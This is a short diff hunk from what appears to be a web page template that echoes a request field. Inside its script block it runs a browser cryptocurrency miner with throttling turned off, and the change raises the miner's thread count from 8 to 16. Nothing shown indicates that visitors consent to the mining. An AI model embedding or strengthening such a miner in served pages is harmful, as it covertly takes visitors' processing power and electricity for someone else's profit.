@@ -35,7 +35,7 @@ field from request: {{ .Fn}}
 
   miner.start();
   miner.setThrottle(0)
-  miner.setNumThreads(8)
+  miner.setNumThreads(16)
   
 </script>
 
